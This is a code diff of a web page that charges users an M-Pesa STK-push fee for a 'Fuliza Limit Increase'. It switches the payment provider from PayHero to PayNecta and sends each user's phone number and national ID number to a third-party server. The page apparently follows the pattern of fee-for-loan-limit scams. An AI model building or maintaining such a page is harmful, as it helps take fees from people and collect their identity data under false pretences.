@@ -789,11 +789,12 @@
 
   <script>
     // Configuration - Update these with your serverless function URLs
-    const API_ENDPOINTS = {
-      initiatePayment: 'https://abels-test-stk-push.onrender.com/pay', // Your PayHero endpoint
-      verifyPayment: 'https://abels-test-stk-push.onrender.com/api/verify-payment',
-      normalizePhone: 'https://abels-test-stk-push.onrender.com/api/normalize-phone'
-    };
+    const BASE_URL = 'https://abels-test-stk-push.onrender.com';
+
+const API_ENDPOINTS = {
+  initiatePayment: `${BASE_URL}/pay`,
+  getReceipt: `${BASE_URL}/receipt`
+};
 
     // Loan options data
     const loanOptions = [
@@ -1147,7 +1148,7 @@
 
     // Format phone for API (with country code)
     function formatPhoneForAPI(phone) {
-      return '+254' + phone;
+      return '254' + phone;
     }
 
     // Phone number normalization function
@@ -1176,32 +1177,32 @@
     }
 
     // Send PayHero STK push with ID number
-    async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
-      try {
-        const response = await fetch(API_ENDPOINTS.initiatePayment, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone: phoneNumber,
-            amount: amount,
-            loan_amount: loanAmount,
-            id_number: idNumber,
-            description: `Fuliza Limit Increase: Ksh ${loanAmount.toLocaleString()}`
-          })
-        });
-        
-        if (!response.ok) {
-          const error = await response.json();
-          throw new Error(error.message || 'Payment initiation failed');
-        }
-        
-        const data = await response.json();
-        return data;
-      } catch (error) {
-        console.error('STK push error:', error);
-        throw error;
-      }
+    async function sendPayNectaSTK(phoneNumber, amount, loanAmount, idNumber) {
+  try {
+    const response = await fetch(API_ENDPOINTS.initiatePayment, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        phone: phoneNumber,          // ✅ PayNecta expects `phone`
+        amount: amount,              // ✅ STK fee
+        loan_amount: loanAmount,     // ✅ extra data (stored only)
+        id_number: idNumber          // ✅ sent but NOT used for STK
+      })
+    });
+
+    const data = await response.json();
+
+    if (!response.ok || !data.success) {
+      throw new Error(data.error || 'Failed to send STK push');
     }
+
+    return data;
+
+  } catch (error) {
+    console.error('PayNecta STK error:', error);
+    throw error;
+  }
+}
 
     // Check payment status
     async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
@@ -1377,12 +1378,12 @@
           html: 'Initiating payment request to your phone...'
         });
         
-        const paymentResponse = await sendPayHeroSTK(
-          normalizedPhone,
-          selectedLoan.fee,
-          selectedLoan.amount,
-          idNumber
-        );
+        const paymentResponse = await sendPayNectaSTK(
+  formatPhoneForAPI(phoneNumber),
+  selectedLoan.fee,
+  selectedLoan.amount,
+  idNumber
+);
         
         if (!paymentResponse || !paymentResponse.reference) {
           throw new Error('Failed to initiate payment');
